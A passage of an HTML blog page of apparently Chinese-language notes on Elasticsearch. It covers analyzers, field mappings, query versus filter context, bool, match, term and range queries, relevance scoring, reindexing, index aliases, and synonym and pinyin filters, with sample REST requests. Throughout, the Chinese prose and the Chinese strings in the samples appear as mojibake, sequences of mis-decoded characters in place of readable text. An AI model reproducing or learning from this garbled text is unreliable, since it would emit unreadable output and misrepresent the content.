ï¼‰ï¼Œåˆ é™¤è¯æ¡ï¼ˆä¾‹å¦‚ï¼Œ åƒ a<code>ï¼Œ </code>and<code>ï¼Œ </code>the ç­‰æ— ç”¨è¯ï¼‰ï¼Œæˆ–è€…å¢åŠ è¯æ¡ï¼ˆä¾‹å¦‚ï¼Œåƒ jump å’Œ leap è¿™ç§åŒä¹‰è¯ï¼‰ã€‚</li></ul><h4 id="æµ‹è¯•åˆ†è¯å™¨"><a href="#æµ‹è¯•åˆ†è¯å™¨" class="headerlink" title="æµ‹è¯•åˆ†è¯å™¨"></a>æµ‹è¯•åˆ†è¯å™¨</h4><blockquote><p>&#x2F;_analyze?analyzer&#x3D;ik_smart&amp;pretty&#x3D;true&amp;text&#x3D;word</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;standard&quot;, // åˆ†è¯å™¨åç§°</span><br><span class="line">  &quot;text&quot;: &quot;Text to analyze&quot; // è¢«åˆ†è¯çš„æ–‡æœ¬</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ˜ å°„"><a href="#æ˜ å°„" class="headerlink" title="æ˜ å°„"></a>æ˜ å°„</h3><p>Elasticsearch æ”¯æŒ å¦‚ä¸‹ç®€å•åŸŸç±»å‹ï¼š</p><ul><li>å­—ç¬¦ä¸²: string</li><li>æ•´æ•° : byte, short, integer, long</li><li>æµ®ç‚¹æ•°: float, double</li><li>å¸ƒå°”å‹: boolean</li><li>æ—¥æœŸ: date</li></ul><p>è·å–æŸä¸ªç±»å‹çš„mapping</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /website/_mapping/blog</span><br></pre></td></tr></table></figure><p><a href="https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping-intro.html">https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping-intro.html</a><br><img src="/images/WechatIMG32.jpeg"></p><blockquote><p>å½“ <code>index</code> è®¾ç½®ä¸º <code>no</code> æ—¶æ„å‘³ç€ <code>elasticsearch</code> ä¸å¯¹è¿™ä¸ªè‡ªåŠ¨ç´¢å¼•ï¼Œä»…ä»…æ˜¯å­˜å‚¨ï¼ˆå…·ä½“è¿˜è¦çœ‹ç´¢å¼•é…ç½®æ˜¯å¦å­˜å‚¨ <code>_source</code> ï¼‰ã€‚æˆ‘ä»¬ä¸èƒ½å†æ­¤å­—æ®µåº”ç”¨ä»»ä½•å½¢å¼ï¼ˆæ¨¡ç³Šã€ç²¾ç¡®ã€èŒƒå›´ï¼‰çš„æŸ¥è¯¢ã€‚</p></blockquote><h3 id="å¤æ‚æ ¸å¿ƒåŸŸç±»å‹"><a href="#å¤æ‚æ ¸å¿ƒåŸŸç±»å‹" class="headerlink" title="å¤æ‚æ ¸å¿ƒåŸŸç±»å‹"></a>å¤æ‚æ ¸å¿ƒåŸŸç±»å‹</h3><p>é™¤äº†ç®€å•æ ‡é‡æ•°æ®ç±»å‹ï¼ŒJSON è¿˜æœ‰ null å€¼ï¼Œæ•°ç»„ï¼Œå’Œå¯¹è±¡ã€‚è¿™äº› Elasticsearch éƒ½æ˜¯æ”¯æŒçš„ã€‚</p><h3 id="æŸ¥è¯¢ä¸è¿‡æ»¤"><a href="#æŸ¥è¯¢ä¸è¿‡æ»¤" class="headerlink" title="æŸ¥è¯¢ä¸è¿‡æ»¤"></a>æŸ¥è¯¢ä¸è¿‡æ»¤</h3><p>Elasticsearch ä½¿ç”¨çš„æŸ¥è¯¢è¯­è¨€ï¼ˆDSLï¼‰ æ‹¥æœ‰ä¸€å¥—æŸ¥è¯¢ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶å¯ä»¥ä»¥æ— é™ç»„åˆçš„æ–¹å¼è¿›è¡Œæ­é…ã€‚è¿™å¥—ç»„ä»¶å¯ä»¥åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ä½¿ç”¨ï¼šè¿‡æ»¤æƒ…å†µï¼ˆfiltering contextï¼‰å’ŒæŸ¥è¯¢æƒ…å†µï¼ˆquery contextï¼‰ã€‚</p><p>å½“ä½¿ç”¨äº è¿‡æ»¤æƒ…å†µ æ—¶ï¼ŒæŸ¥è¯¢è¢«è®¾ç½®æˆä¸€ä¸ªâ€œä¸è¯„åˆ†â€æˆ–è€…â€œè¿‡æ»¤â€æŸ¥è¯¢ã€‚å³ï¼Œè¿™ä¸ªæŸ¥è¯¢åªæ˜¯ç®€å•çš„é—®ä¸€ä¸ªé—®é¢˜ï¼šâ€œè¿™ç¯‡æ–‡æ¡£æ˜¯å¦åŒ¹é…ï¼Ÿâ€ã€‚å›ç­”ä¹Ÿæ˜¯éå¸¸çš„ç®€å•ï¼Œyes æˆ–è€… no ï¼ŒäºŒè€…å¿…å±…å…¶ä¸€ã€‚</p><ul><li>created æ—¶é—´æ˜¯å¦åœ¨ 2013 ä¸ 2014 è¿™ä¸ªåŒºé—´ï¼Ÿ</li><li>status å­—æ®µæ˜¯å¦åŒ…å« published è¿™ä¸ªå•è¯ï¼Ÿ</li><li>lat_lon å­—æ®µè¡¨ç¤ºçš„ä½ç½®æ˜¯å¦åœ¨æŒ‡å®šç‚¹çš„ 10km èŒƒå›´å†…ï¼Ÿ</li></ul><p>å½“ä½¿ç”¨äº æŸ¥è¯¢æƒ…å†µ æ—¶ï¼ŒæŸ¥è¯¢å°±å˜æˆäº†ä¸€ä¸ªâ€œè¯„åˆ†â€çš„æŸ¥è¯¢ã€‚å’Œä¸è¯„åˆ†çš„æŸ¥è¯¢ç±»ä¼¼ï¼Œä¹Ÿè¦å»åˆ¤æ–­è¿™ä¸ªæ–‡æ¡£æ˜¯å¦åŒ¹é…ï¼ŒåŒæ—¶å®ƒè¿˜éœ€è¦åˆ¤æ–­è¿™ä¸ªæ–‡æ¡£åŒ¹é…çš„æœ‰ <em>å¤šå¥½</em>ï¼ˆåŒ¹é…ç¨‹åº¦å¦‚ä½•ï¼‰ã€‚ æ­¤æŸ¥è¯¢çš„å…¸å‹ç”¨æ³•æ˜¯ç”¨äºæŸ¥æ‰¾ä»¥ä¸‹æ–‡æ¡£ï¼š</p><ul><li>æŸ¥æ‰¾ä¸ full text search è¿™ä¸ªè¯è¯­æœ€ä½³åŒ¹é…çš„æ–‡æ¡£</li><li>åŒ…å« run è¿™ä¸ªè¯ï¼Œä¹Ÿèƒ½åŒ¹é… runs ã€ running ã€ jog æˆ–è€… sprint</li><li>åŒ…å« quick ã€ brown å’Œ fox è¿™å‡ ä¸ªè¯ â€” è¯ä¹‹é—´ç¦»çš„è¶Šè¿‘ï¼Œæ–‡æ¡£ç›¸å…³æ€§è¶Šé«˜</li><li>æ ‡æœ‰ lucene ã€ search æˆ–è€… java æ ‡ç­¾ â€” æ ‡ç­¾è¶Šå¤šï¼Œç›¸å…³æ€§è¶Šé«˜</li></ul><p>ä¸€ä¸ªè¯„åˆ†æŸ¥è¯¢è®¡ç®—æ¯ä¸€ä¸ªæ–‡æ¡£ä¸æ­¤æŸ¥è¯¢çš„ <em>ç›¸å…³ç¨‹åº¦</em>ï¼ŒåŒæ—¶å°†è¿™ä¸ªç›¸å…³ç¨‹åº¦åˆ†é…ç»™è¡¨ç¤ºç›¸å…³æ€§çš„å­—æ®µ <code>_score</code>ï¼Œå¹¶ä¸”æŒ‰ç…§ç›¸å…³æ€§å¯¹åŒ¹é…åˆ°çš„æ–‡æ¡£è¿›è¡Œæ’åºã€‚è¿™ç§ç›¸å…³æ€§çš„æ¦‚å¿µæ˜¯éå¸¸é€‚åˆå…¨æ–‡æœç´¢çš„æƒ…å†µï¼Œå› ä¸ºå…¨æ–‡æœç´¢å‡ ä¹æ²¡æœ‰å®Œå…¨ â€œæ­£ç¡®â€ çš„ç­”æ¡ˆã€‚</p><p>è¿‡æ»¤æŸ¥è¯¢ï¼ˆFiltering queriesï¼‰åªæ˜¯ç®€å•çš„æ£€æŸ¥åŒ…å«æˆ–è€…æ’é™¤ï¼Œè¿™å°±ä½¿å¾—è®¡ç®—èµ·æ¥éå¸¸å¿«ã€‚é€šå¸¸çš„ä½¿ç”¨æŸ¥è¯¢ï¼ˆqueryï¼‰è¯­å¥æ¥è¿›è¡Œå…¨æ–‡æœç´¢æˆ–è€…å…¶å®ƒä»»ä½•éœ€è¦å½±å“ç›¸å…³æ€§å¾—åˆ†çš„æœç´¢ã€‚é™¤æ­¤ä»¥å¤–çš„æƒ…å†µéƒ½ä½¿ç”¨è¿‡æ»¤ï¼ˆfilters)ã€‚</p><p>ç»„åˆæŸ¥è¯¢<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;must&quot;:     [&#123; &quot;match&quot;: &#123; &quot;tweet&quot;: &quot;elasticsearch&quot; &#125;&#125;],</span><br><span class="line">            &quot;must_not&quot;: [&#123; &quot;match&quot;: &#123; &quot;name&quot;:  &quot;mary&quot; &#125;&#125;],</span><br><span class="line">            &quot;should&quot;:   [&#123; &quot;match&quot;: &#123; &quot;tweet&quot;: &quot;full text&quot; &#125;&#125;], // ç­‰ä»·äº or </span><br><span class="line">            &quot;filter&quot;:   [&#123; &quot;range&quot;: &#123; &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;&#125; &#125;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>must<br>  æ–‡æ¡£ å¿…é¡» åŒ¹é…è¿™äº›æ¡ä»¶æ‰èƒ½è¢«åŒ…å«è¿›æ¥ã€‚</li><li>must_not<br>  æ–‡æ¡£ å¿…é¡»ä¸ åŒ¹é…è¿™äº›æ¡ä»¶æ‰èƒ½è¢«åŒ…å«è¿›æ¥ã€‚</li><li>should<br>  å¦‚æœæ»¡è¶³è¿™äº›è¯­å¥ä¸­çš„ä»»æ„è¯­å¥ï¼Œå°†å¢åŠ  _score (é€šè¿‡boostå‚æ•°è®¾ç½®åŠ å‡ åˆ†ï¼Œé»˜è®¤1åˆ†)ï¼Œå¦åˆ™ï¼Œæ— ä»»ä½•å½±å“ã€‚å®ƒä»¬ä¸»è¦ç”¨äºä¿®æ­£æ¯ä¸ªæ–‡æ¡£çš„ç›¸å…³æ€§å¾—åˆ†ã€‚</li><li>filter<br>  å¿…é¡»åŒ¹é…ï¼Œä½†å®ƒä»¥ä¸è¯„åˆ†ã€è¿‡æ»¤æ¨¡å¼æ¥è¿›è¡Œã€‚è¿™äº›è¯­å¥å¯¹è¯„åˆ†æ²¡æœ‰è´¡çŒ®ï¼Œåªæ˜¯æ ¹æ®è¿‡æ»¤æ ‡å‡†æ¥æ’é™¤æˆ–åŒ…å«æ–‡æ¡£ã€‚</li></ul><h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><ul><li>match_all åŒ¹é…æ‰€æœ‰æ–‡æ¡£  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>match æŸ¥è¯¢ï¼ˆæ¨¡ç³Šï¼‰  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;title&quot;: &quot;é™ˆå¿ å®&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>multi_match å¤šä¸ªå­—æ®µæŸ¥è¯¢åº”ç”¨ä¸€ä¸ªæŸ¥è¯¢æ¡ä»¶  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;multi_match&quot;: &#123;</span><br><span class="line">            &quot;query&quot;: &quot;é™ˆå¿ å®&quot;,</span><br><span class="line">            &quot;fields&quot;: [&quot;title&quot;, &quot;author&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>range æŸ¥è¯¢æ‰¾å‡ºé‚£äº›è½åœ¨æŒ‡å®šåŒºé—´å†…çš„æ•°å­—æˆ–è€…æ—¶é—´  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">        &quot;age&quot;: &#123;</span><br><span class="line">            &quot;gte&quot;:  20,</span><br><span class="line">            &quot;lt&quot;:   30</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>term æŸ¥è¯¢è¢«ç”¨äºç²¾ç¡®å€¼ åŒ¹é…ï¼Œè¿™äº›ç²¾ç¡®å€¼å¯èƒ½æ˜¯æ•°å­—ã€æ—¶é—´ã€å¸ƒå°”æˆ–è€…é‚£äº›<code>not_analyzed</code>çš„å­—ç¬¦ä¸²  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;term&quot;: &#123; &quot;age&quot;:    26           &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;date&quot;:   &quot;2014-09-01&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;public&quot;: true         &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;tag&quot;:    &quot;full_text&quot;  &#125;&#125;</span><br></pre></td></tr></table></figure></li><li>terms æŸ¥è¯¢å’Œ term æŸ¥è¯¢ä¸€æ ·ï¼Œä½†å®ƒå…è®¸ä½ æŒ‡å®šå¤šå€¼è¿›è¡ŒåŒ¹é…ã€‚  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;terms&quot;: &#123; &quot;tag&quot;: [ &quot;search&quot;, &quot;full_text&quot;, &quot;nosql&quot; ] &#125;&#125;</span><br></pre></td></tr></table></figure></li><li>exists æŸ¥è¯¢å’Œ missing æŸ¥è¯¢è¢«ç”¨äºæŸ¥æ‰¾é‚£äº›æŒ‡å®šå­—æ®µä¸­æœ‰å€¼ (exists) æˆ–æ— å€¼ (missing) çš„æ–‡æ¡£ã€‚  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;exists&quot;:   &#123;</span><br><span class="line">        &quot;field&quot;:    &quot;title&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>filter</li></ul><h3 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h3><p>ElasticSearch é»˜è®¤æ’åºæ˜¯<code>_score</code>é™åºã€‚</p><blockquote><p>å¦‚æœæˆ‘ä»¬ä¸éœ€è¦è¯„åˆ†ï¼Œå¯ä»¥ä½¿ç”¨ <code>constant_score</code> æŸ¥è¯¢è¿›è¡Œæ›¿ä»£ï¼Œè¿™å°†è®©æ‰€æœ‰æ–‡æ¡£åº”ç”¨ä¸€ä¸ªæ’å®šåˆ†æ•°ï¼ˆé»˜è®¤ä¸º 1 ï¼‰ã€‚å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨é»˜è®¤çš„<code>_score</code>æ’åºï¼Œé‚£ä¹ˆ <code>_score</code> å’Œ <code>max_score</code> å­—æ®µéƒ½æ˜¯ null ã€‚ è®¡ç®— <code>_score</code> çš„èŠ±é”€å·¨å¤§ï¼Œé€šå¸¸ä»…ç”¨äºæ’åºï¼› æˆ‘ä»¬å¹¶ä¸æ ¹æ®ç›¸å…³æ€§æ’åºï¼Œæ‰€ä»¥è®°å½• <code>_score</code> æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚å¦‚æœæ— è®ºå¦‚ä½•ä½ éƒ½è¦è®¡ç®—<code> _score</code> ï¼Œ ä½ å¯ä»¥å°† <code>track_scores</code> å‚æ•°è®¾ç½®ä¸º true</p></blockquote><h3 id="ç›¸å…³æ€§"><a href="#ç›¸å…³æ€§" class="headerlink" title="ç›¸å…³æ€§"></a>ç›¸å…³æ€§</h3><p>æ¯ä¸ªæ–‡æ¡£éƒ½æœ‰ç›¸å…³æ€§è¯„åˆ†ï¼Œç”¨ä¸€ä¸ªæ­£æµ®ç‚¹æ•°å­—æ®µ _score æ¥è¡¨ç¤º ã€‚ _score çš„è¯„åˆ†è¶Šé«˜ï¼Œç›¸å…³æ€§è¶Šé«˜ã€‚</p><ul><li><p>æ£€ç´¢è¯é¢‘ç‡<br>  æ£€ç´¢è¯åœ¨è¯¥å­—æ®µå‡ºç°çš„é¢‘ç‡ï¼Ÿå‡ºç°é¢‘ç‡è¶Šé«˜ï¼Œç›¸å…³æ€§ä¹Ÿè¶Šé«˜ã€‚ å­—æ®µä¸­å‡ºç°è¿‡ 5 æ¬¡è¦æ¯”åªå‡ºç°è¿‡ 1 æ¬¡çš„ç›¸å…³æ€§é«˜ã€‚</p></li><li><p>åå‘æ–‡æ¡£é¢‘ç‡<br>  æ¯ä¸ªæ£€ç´¢è¯åœ¨ç´¢å¼•ä¸­å‡ºç°çš„é¢‘ç‡ï¼Ÿé¢‘ç‡è¶Šé«˜ï¼Œç›¸å…³æ€§è¶Šä½ã€‚æ£€ç´¢è¯å‡ºç°åœ¨å¤šæ•°æ–‡æ¡£ä¸­ä¼šæ¯”å‡ºç°åœ¨å°‘æ•°æ–‡æ¡£ä¸­çš„æƒé‡æ›´ä½ã€‚</p></li><li><p>å­—æ®µé•¿åº¦å‡†åˆ™<br>  å­—æ®µçš„é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿé•¿åº¦è¶Šé•¿ï¼Œç›¸å…³æ€§è¶Šä½ã€‚ æ£€ç´¢è¯å‡ºç°åœ¨ä¸€ä¸ªçŸ­çš„ title è¦æ¯”åŒæ ·çš„è¯å‡ºç°åœ¨ä¸€ä¸ªé•¿çš„ content å­—æ®µæƒé‡æ›´å¤§ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹ç›¸å…³æ€§æ˜¯å¦‚ä½•è®¡ç®—çš„</span><br><span class="line"></span><br><span class="line">GET /_search?explain </span><br><span class="line">&#123;</span><br><span class="line">   &quot;query&quot;: &#123; &quot;match&quot; : &#123; &quot;tweet&quot; : &quot;honeymoon&quot; &#125; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‡å»ºç´¢å¼•"><a href="#é‡å»ºç´¢å¼•" class="headerlink" title="é‡å»ºç´¢å¼•"></a>é‡å»ºç´¢å¼•</h3><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-reindex.html">https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-reindex.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  &quot;source&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;twitter&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dest&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;new_twitter&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç´¢å¼•åˆ«å"><a href="#ç´¢å¼•åˆ«å" class="headerlink" title="ç´¢å¼•åˆ«å"></a>ç´¢å¼•åˆ«å</h3><p><code>my_index</code> æŒ‡å‘ <code>my_index_v1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUT /my_index_v1 </span><br><span class="line">PUT /my_index_v1/_alias/my_index</span><br></pre></td></tr></table></figure><h3 id="matchç²¾åº¦"><a href="#matchç²¾åº¦" class="headerlink" title="matchç²¾åº¦"></a>matchç²¾åº¦</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;match&quot;: &#123;</span><br><span class="line">    &quot;title&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &quot;css æƒå¨æŒ‡å—&quot;,</span><br><span class="line">        &quot;operator&quot;: &quot;and&quot;, // æ“ä½œç¬¦ å…³é”®è¯åŒ¹é…æ˜¯orè¿˜æ˜¯and </span><br><span class="line">        &quot;minimum_should_match&quot;: &quot;70%&quot; // è‡³å°‘åŒ¹é…å¤šå°‘ä¸ªå…³é”®è¯</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒä¹‰è¯"><a href="#åŒä¹‰è¯" class="headerlink" title="åŒä¹‰è¯"></a>åŒä¹‰è¯</h3><blockquote><p><code>synonyms_path</code>ç›¸å¯¹äº<code>elasticsearch</code>çš„<code>config</code>æ–‡ä»¶ç›®å½•ï¼Œä¸€èˆ¬ä½äº<code>/etc/elasticsearch</code>ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /[index_name]</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¼éŸ³"><a href="#æ‹¼éŸ³" class="headerlink" title="æ‹¼éŸ³"></a>æ‹¼éŸ³</h3><blockquote><p>æ±‰å­—è½¬æ‹¼éŸ³æ˜¯ä¸å¯é€†çš„è¿‡ç¨‹ã€‚<code>æ±‰å­—</code>ï¼Œ<code>æ±—æ¸</code> ä¸¤è€…çš„æ‹¼éŸ³éƒ½æ˜¯<code>hanzi</code>ã€‚å½“ç”¨æˆ·è¾“å…¥<code>æ±‰å­—</code>æ˜¯æˆ‘ä»¬æ˜ç¡®çŸ¥é“ç”¨æˆ·æƒ³æœä»€ä¹ˆï¼Œä½†æ˜¯å¦‚æœæ˜¯æ‹¼éŸ³<code>hanzi</code>ï¼Œè¿™æ—¶æ— æ³•å‡†ç¡®æ¨æ–­ç”¨æˆ·çš„çœŸå®æƒ³æ³•ã€‚è¿™æ—¶æœç´¢ç»“æœä¸­å¯èƒ½<code>æ±‰å­—</code>ã€<code>æ±—æ¸</code>éƒ½ä¼šå‡ºç°ã€‚<br><a href="https://github.com/medcl/elasticsearch-analysis-pinyin">https://github.com/medcl/elasticsearch-analysis-pinyin</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PUT /[index_name]</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true,</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;pinyin_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;pinyin&quot;,</span><br><span class="line">                    &quot;keep_first_letter&quot;: false,</span><br><span class="line">                    &quot;keep_full_pinyin&quot;: false,</span><br><span class="line">                    &quot;keep_joined_full_pinyin&quot;: true,</span><br><span class="line">                    &quot;keep_separate_first_letter&quot;: false,</span><br><span class="line">                    &quot;keep_original&quot;: true</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;analyzer&quot;:    &#123;</span><br><span class="line">                &quot;ik_smart_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_smart&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;ik_max_word_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_max_word&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹æ‰€æœ‰index"><a href="#æŸ¥çœ‹æ‰€æœ‰index" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰index"></a>æŸ¥çœ‹æ‰€æœ‰index</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/_cat/indices</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><ol><li>åˆ›å»ºç´¢å¼•</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 